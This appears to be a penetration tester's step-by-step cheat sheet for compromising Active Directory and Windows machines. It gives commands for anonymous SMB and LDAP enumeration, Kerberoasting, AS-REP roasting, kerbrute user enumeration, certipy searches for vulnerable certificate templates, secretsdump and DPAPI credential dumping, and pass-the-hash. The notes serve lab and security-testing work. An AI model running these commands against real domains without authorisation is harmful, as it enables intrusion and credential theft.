# Step-by-Step AD/Windows Machine

## Initial Access

### Without Credential

* Enum4Linux&#x20;

```bash
enum4linux-ng IP
```

* SMB anonymous login

```bash
smbclient -L //10.10.178.64 -N
smbclient -N //10.10.178.64/Data
```

* LDAP anonymous informations

{% code overflow="wrap" %}
```
# query for Name and Description (sometimes we can find passowrds)
ldapsearch -x -H ldap://<TARGET_IP> -b "dc=example,dc=com" "(objectClass=user)" cn description
```
{% endcode %}

{% content-ref url="active-directory-pt/ad-enumeration/ldap.md" %}
[ldap.md](active-directory-pt/ad-enumeration/ldap.md)
{% endcontent-ref %}

* Web Page&#x20;

#### Anonymous allowing

* Enum AD with Kerbrute

{% content-ref url="active-directory-pt/ad-initial-attack-vectors/kerbrute.md" %}
[kerbrute.md](active-directory-pt/ad-initial-attack-vectors/kerbrute.md)
{% endcontent-ref %}

* Try get Kerberostable users

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN.local/ -outputfile hashes.kerberoast
```
{% endcode %}

{% content-ref url="active-directory-pt/ad-post-compromise-attacks/kerberoasting.md" %}
[kerberoasting.md](active-directory-pt/ad-post-compromise-attacks/kerberoasting.md)
{% endcontent-ref %}

* Try to get ASREP Roastable users

```bash
impacket-GetNPUUsers.py $DOMAIN/ -dc-ip $DC_IP 
```

{% content-ref url="active-directory-pt/ad-post-compromise-attacks/as-rep-roasting.md" %}
[as-rep-roasting.md](active-directory-pt/ad-post-compromise-attacks/as-rep-roasting.md)
{% endcontent-ref %}



If all of these techniques doens't work we have to try to catch some NTLM hash credentials or some like this.

{% content-ref url="active-directory-pt/ad-initial-attack-vectors/" %}
[ad-initial-attack-vectors](active-directory-pt/ad-initial-attack-vectors/)
{% endcontent-ref %}



### With Credentials

Enumeration:

* Enum4Linux&#x20;

```bash
enum4linux-ng -u USER -p PASS IP
```

* SMB Shares
* Bloodhound ( or Find **Kerberostable**, **AS-Roastable** accounts)
  * Check the information from "Node Info" of initial user.
* AD CS vuln template

```bash
certipy find -u 'billy@foobar.com' -p <password> -dc-ip <DC_IP> -vulnerable -enabled

cat *_Certipy.txt | grep ESC
```

* Impacket-secretsdump
  * Pass-the-Hash / Pass-the-Password
* WinRM connection
  * evil-winrm
  * Create persistence shell&#x20;

{% content-ref url="executive-pt/post-exploitation/payload-development.md" %}
[payload-development.md](executive-pt/post-exploitation/payload-development.md)
{% endcontent-ref %}

* FTP connection
* SSH connection



## AD Enum

#### Kerberos User enumeration

* Verify users exist in the domain

```bash
./kerbrute_linux_amd64 userenum users.txt --domain DOMAIN.local --dc <IP>
```

{% content-ref url="active-directory-pt/ad-initial-attack-vectors/kerbrute.md" %}
[kerbrute.md](active-directory-pt/ad-initial-attack-vectors/kerbrute.md)
{% endcontent-ref %}





## PrivEsc:

* Local Enumeration ( Get all possible informations)

{% content-ref url="executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/windows-local-enumeration.md" %}
[windows-local-enumeration.md](executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/windows-local-enumeration.md)
{% endcontent-ref %}

* WinPeas
* Privs (whoami /priv)
  * Access Token Impersonation
* Check All AD user (deleted, disable, active)
* Mimikatz&#x20;
* Certipy (more if there is a CA\_SVC user)



## As Admin

### Dump

* impacket-secretsdump
* Mimikatz
* DPAPI with NetExec

```bash
# with Pass-the-Hash
nxc smb DOMAIN -u administrator -H 'REDACTED' --dpapi
```

When we have a hash we can:

* Do Pass-The-Hash
* Use `Hash-Identify` to get the type and crack it



## Crack Hash

* Hashcat & John

